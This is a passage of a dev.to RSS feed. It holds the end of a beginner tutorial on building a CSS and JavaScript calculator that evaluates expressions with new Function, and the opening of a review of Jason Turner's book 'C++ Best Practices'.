    &lt;span class="nl"&gt;text-align&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;right&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.all-btn&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;25rem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;display&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;grid&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="py"&gt;grid-template-columns&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;repeat&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="m"&gt;4&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt;&lt;span class="n"&gt;fr&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.btn&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
&lt;span class="nc"&gt;.clear&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
&lt;span class="nc"&gt;.equal-btn&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;font-family&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="n"&gt;var&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;--karla&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#231e23&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#ffffff&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;6.5rem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;cursor&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nb"&gt;pointer&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;border&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0.08rem&lt;/span&gt; &lt;span class="nb"&gt;solid&lt;/span&gt; &lt;span class="no"&gt;white&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="nl"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;2rem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.btn&lt;/span&gt;&lt;span class="nd"&gt;:focus&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
&lt;span class="nc"&gt;.clear&lt;/span&gt;&lt;span class="nd"&gt;:focus&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
&lt;span class="nc"&gt;.equal-btn&lt;/span&gt;&lt;span class="nd"&gt;:focus&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;border&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0.3rem&lt;/span&gt; &lt;span class="nb"&gt;solid&lt;/span&gt; &lt;span class="m"&gt;#536DFE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.plus&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#F9A826&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.minus&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#00BFA6&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.times&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#536DFE&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.times&lt;/span&gt;&lt;span class="nd"&gt;:focus&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;border&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;0.3rem&lt;/span&gt; &lt;span class="nb"&gt;solid&lt;/span&gt; &lt;span class="m"&gt;#F9A826&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.division&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#00B0FF&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.equal&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#EC4899&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nc"&gt;.clear&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nl"&gt;background-color&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;#F54748&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;@media&lt;/span&gt; &lt;span class="n"&gt;screen&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max-width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;500px&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nc"&gt;.screen&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;310px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nc"&gt;.all-btn&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;310px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="k"&gt;@media&lt;/span&gt; &lt;span class="n"&gt;screen&lt;/span&gt; &lt;span class="n"&gt;and&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;max-width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="m"&gt;310px&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nc"&gt;.screen&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;250px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nc"&gt;.all-btn&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nl"&gt;width&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;250px&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="nc"&gt;.btn&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
    &lt;span class="nc"&gt;.clear&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;
    &lt;span class="nc"&gt;.equal-btn&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="nl"&gt;height&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;5rem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
        &lt;span class="nl"&gt;font-size&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="m"&gt;1.5rem&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
    &lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;For the javascript part at first we will select our &lt;code&gt;.screen&lt;/code&gt; where we will show our current calculation and the calculation result.&lt;/p&gt;

&lt;p&gt;We will create a &lt;code&gt;result&lt;/code&gt; variable and we will assign it to 0 because in this variable we will store our calculation everytime.&lt;/p&gt;

&lt;p&gt;The we will select all the button using &lt;code&gt;document.querySelectorAll(".btn")&lt;/code&gt;. Then we will use &lt;code&gt;forEach&lt;/code&gt; method to loop over every button. After that we will target every button and use &lt;code&gt;event.currentTarget.innerHTML&lt;/code&gt; and store it in the &lt;code&gt;value&lt;/code&gt; variable so that whenever we will click on a button we will get the number or operator a string.&lt;/p&gt;

&lt;p&gt;After that we use &lt;code&gt;screen.value+=value&lt;/code&gt; to keep track of our live calculation.&lt;/p&gt;

&lt;p&gt;We will store this &lt;code&gt;screen.value&lt;/code&gt; in &lt;code&gt;val&lt;/code&gt; variable where we will replace our &lt;code&gt;√∑&lt;/code&gt;with &lt;code&gt;/&lt;/code&gt; and &lt;code&gt;√ó&lt;/code&gt; with &lt;code&gt;*&lt;/code&gt;. Read more about replace multiple character in one replace call &lt;a href="https://stackoverflow.com/questions/16576983/replace-multiple-characters-in-one-replace-call"&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Then we will create a object literal &lt;code&gt;formula&lt;/code&gt; where we will create a key "expression" and the value will be our &lt;code&gt;val&lt;/code&gt; variable, because the equation we typed in our screen is in now in the &lt;code&gt;val&lt;/code&gt; variable as a string.&lt;/p&gt;

&lt;p&gt;Then we will evaluate our string using new Function of javascript which we will give our result and we will assign this to the &lt;code&gt;result&lt;/code&gt; variable. Read more about string evaluation &lt;a href="https://stackoverflow.com/questions/36422754/javascript-front-end-evaluate-string-as-expression-alternative-for-using-eva"&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Finally we will assign the &lt;code&gt;screen.value = result&lt;/code&gt; so that we can show the output in the screen.&lt;/p&gt;

&lt;p&gt;For the screen clearing part, we will select the &lt;code&gt;.clear&lt;/code&gt; button and whenever we click this button we will assign &lt;code&gt;screen.value=""&lt;/code&gt; as an empty string and the screen will be cleared.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight javascript"&gt;&lt;code&gt;&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;screen&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;querySelector&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;.screen&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;clear&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;querySelector&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;.clear&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;clear&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;click&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
    &lt;span class="nx"&gt;screen&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;""&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;});&lt;/span&gt;


&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;allBtn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;querySelectorAll&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;.btn&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="nx"&gt;allBtn&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;forEach&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="nx"&gt;btn&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="nx"&gt;btn&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;click&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
        &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;event&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;currentTarget&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;innerHTML&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

        &lt;span class="nx"&gt;screen&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

        &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;equalBtn&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;querySelector&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;.equal&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;

        &lt;span class="nx"&gt;equalBtn&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;addEventListener&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;click&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;

            &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;replaceTwoOperators&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;√∑&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;/&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;√ó&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;*&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="p"&gt;};&lt;/span&gt;

            &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;val&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;screen&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;replace&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="sr"&gt;/√∑|√ó/g&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;replaceTwoOperators&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;match&lt;/span&gt;&lt;span class="p"&gt;];&lt;/span&gt;
            &lt;span class="p"&gt;});&lt;/span&gt;


            &lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;formula&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;expression&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;val&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
            &lt;span class="p"&gt;};&lt;/span&gt;

            &lt;span class="kd"&gt;const&lt;/span&gt; &lt;span class="nx"&gt;evaluateExpression&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;formula&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
                &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;return (&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="nx"&gt;formula&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;expression&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="s2"&gt;)&lt;/span&gt;&lt;span class="dl"&gt;"&lt;/span&gt;&lt;span class="p"&gt;)();&lt;/span&gt;
            &lt;span class="p"&gt;}&lt;/span&gt;

            &lt;span class="nx"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;evaluateExpression&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;formula&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
            &lt;span class="nx"&gt;screen&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;result&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

        &lt;span class="p"&gt;});&lt;/span&gt;

    &lt;span class="p"&gt;})&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



</description>
      <category>webdev</category>
      <category>javascript</category>
      <category>css</category>
      <category>keywords</category>
    </item>
    <item>
      <title>C++ Best Practices by Jason Turner</title>
      <author>Sandor Dargo</author>
      <pubDate>Sat, 05 Jun 2021 17:59:25 +0000</pubDate>
      <link>https://dev.to/sandordargo/c-best-practices-by-jason-turner-4bj1</link>
      <guid>https://dev.to/sandordargo/c-best-practices-by-jason-turner-4bj1</guid>
      <description>&lt;p&gt;&lt;a href="https://leanpub.com/cppbestpractices"&gt;This is a book&lt;/a&gt; that I've been waiting for to finally read for a long time. I could have bought it, but I decided that it'll be the first book that I buy from the royalties I earned with &lt;a href="https://leanpub.com/cppconst"&gt;How to use const in C++&lt;/a&gt;.  &lt;/p&gt;

&lt;p&gt;My hard-earned money was well invested. Though I was a little bit surprised in the beginning and I was not completely convinced that it was worth the money.&lt;/p&gt;

&lt;p&gt;I attended the talk of &lt;a href="https://cppnow2021.sched.com/event/hhlq"&gt;Jason at C++Now&lt;/a&gt; where among others he talked about his journey of writing this book. He shared his experience with &lt;a href="https://leanpub.com/"&gt;Leanpub&lt;/a&gt; and the reactions he and his book received.&lt;/p&gt;

&lt;p&gt;Leanpub has a 45-day money-back guarantee meaning that you can read any book for free. I say for free because 45 days is enough for most of the books and at the same time, they cannot ask you to return a PDF copy... Despite this generous money-back guarantee, only a few people asked for a refund and their complaints were always about the length of the book. It's 130 pages and it's listed on the page of the book. Anyone can see it as Jason said.&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--RA4Xke-O--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/z3e2fqhtyb63jaqn1ogj.png" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--RA4Xke-O--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/z3e2fqhtyb63jaqn1ogj.png" alt="C++ Best Practices on 130 pages"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;That's right. Anyone can see that number, yet I also had the same idea when I finally bought my (digital) copy a few days before I &lt;em&gt;"went"&lt;/em&gt; to his talk. Maybe I didn't pay attention to the number of pages at all. But the number of pages is not everything. I found that even those pages have plenty of whitespace on them.&lt;/p&gt;

&lt;p&gt;It's not added in purpose to pump up the number of the pages, it's just a consequence of the structure. Around 45 tips in 50 chapters including listings, section headings etc.&lt;/p&gt;

&lt;p&gt;I was a bit puzzled.&lt;/p&gt;

&lt;p&gt;And then an idea struck me. It came in form of a story. Probably you know the story of the expert who has been called to fix a big broken machine in the factory that nobody could fix. He looks at it, examines it for a few minutes, then he replaces a $2 screw. Everyone is amazed and even more when he charges $10,000.&lt;/p&gt;

&lt;p&gt;When the factory manager indignantly asks how can he ask for $10,000 for a few minutes of work and a $2 piece, the expert said that you don't pay for the time it took him to fix, but for the years he learnt how to fix it so easily.&lt;/p&gt;

&lt;p&gt;In the case of this book, you also don't pay for the pages. You pay for the wisdom, the experience, the guiding.&lt;/p&gt;

&lt;p&gt;This guy knows what he talks about. Probably he also knows about the Pareto principle. He knows exactly what matters the most.&lt;/p&gt;

&lt;p&gt;And he listed those items, cutting out all the rest. He doesn't have to &lt;a href="https://quoteinvestigator.com/2012/04/28/shorter-letter/"&gt;apologize that he didn't have time to write a short book so he wrote a long one&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;With his experience and reputation, Jason Turner doesn't have to write long books just to make them "thick" enough.&lt;/p&gt;

&lt;p&gt;And here comes the interesting part which some might consider a weak point of the book. I'd say it's challenging and motivating.&lt;/p&gt;

&lt;p&gt;You'll find relatively few and short explanations directly in the book. Instead, it gives you several exercises, some instructions and lots of references. Instead of giving you know knowledge on a silver spoon, the author decided to show you where the find it. If you prefer, we might say that he teaches the reader to fish, instead of giving us the fish.&lt;/p&gt;

&lt;p&gt;It depends on you if you like this approach. Nevertheless, a book of 130 pages that is easy to read and you can finish it in a half afternoon, might easily give you months of research and exercises.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#some-recommendations"&gt;
  &lt;/a&gt;
  Some recommendations
&lt;/h2&gt;

&lt;p&gt;That's about the book in general, let's see a couple of examples of the recommendations he lists.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#on-constness"&gt;
  &lt;/a&gt;
  On constness
&lt;/h2&gt;

&lt;p&gt;&lt;a href="https://github.com/lefticus"&gt;Lefticus&lt;/a&gt; dedicates two chapters to the importance of using &lt;code&gt;const&lt;/code&gt; and &lt;code&gt;constexpr&lt;/code&gt;, but it is mentioned in multiple places after.&lt;/p&gt;

&lt;p&gt;His point is that everything that is known at compile-time should be declared as &lt;code&gt;constexpr&lt;/code&gt; and the rest should be &lt;code&gt;const&lt;/code&gt; whenever possible.&lt;/p&gt;

&lt;p&gt;These changes make the developer think about the lifetime of objects and it also communicates some meaning, some intentions to the reader.&lt;/p&gt;

&lt;p&gt;If you're looking for more details on constness, check out my book on &lt;a href="https://leanpub.com/cppconst/"&gt;How to use &lt;code&gt;const&lt;/code&gt; in C++&lt;/a&gt;.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#prefer-raw-auto-endraw-in-many-cases"&gt;
  &lt;/a&gt;
  Prefer &lt;code&gt;auto&lt;/code&gt; in many cases
&lt;/h2&gt;

&lt;p&gt;The author shares that he is not a follower of the &lt;a href="https://herbsutter.com/2013/08/12/gotw-94-solution-aaa-style-almost-always-auto/"&gt;Almost Always Auto "movement"&lt;/a&gt; that was propagated by Herb Sutter, but he does think that &lt;code&gt;auto&lt;/code&gt; should be preferred in many cases.&lt;/p&gt;

&lt;p&gt;The reason behind this is that often you should not be concerned by the type of something, such as the return type of &lt;code&gt;std::count&lt;/code&gt;. &lt;/p&gt;

&lt;p&gt;By using &lt;code&gt;auto&lt;/code&gt;, we can spare unnecessary conversions and even data loss!&lt;/p&gt;

&lt;p&gt;Besides, with &lt;code&gt;auto&lt;/code&gt; it's easier to write generic code. C++11 made a big step towards that, but with a better type deduction and generic lambdas, C++14 made an extra leap towards this direction. By the way, the author also suggests skipping C++11 and go directly to C++14 if you haven't migrated yet from old C++.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#beware-of-undefined-behaviour"&gt;
  &lt;/a&gt;
  Beware of undefined behaviour
&lt;/h2&gt;

&lt;p&gt;Undefined behaviour (UB) is something we should avoid as it's dangerous. As such it appears in the book in a couple of places.&lt;/p&gt;

&lt;p&gt;One recommendation of Jason is to treat warnings as errors and to use different sanitisers, such as UBSan and ASan. They will point out most of the UB.&lt;/p&gt;

&lt;p&gt;But that's not everything. He mentions a form of UB that I didn't know about before and I hadn't seen. Checking for &lt;code&gt;this&lt;/code&gt; to be a &lt;code&gt;nullptr&lt;/code&gt; is UB.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
